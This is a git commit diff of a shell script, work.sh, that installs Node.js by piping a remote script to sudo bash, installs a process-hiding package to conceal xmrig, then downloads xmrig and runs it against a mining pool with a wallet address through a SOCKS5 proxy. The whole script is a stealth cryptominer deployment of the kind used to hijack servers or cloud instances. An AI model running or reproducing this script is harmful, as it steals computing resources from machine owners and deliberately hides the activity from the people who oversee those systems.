9ca3adb72b3caefc205b3d90a7f10a40ec8e4e1b
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-05 06:47:43 +0800

    Update work.sh

--- work.sh
+++ work.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update;
 sudo apt upgrade -y;
-sudo apt install screen;
-screen -S work;
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig;
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz && tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=3 -x socks5://192.252.214.20:15864;
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz;
+tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2;
+chmod +x xmrig && ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=3 -x socks5://192.252.214.20:15864;
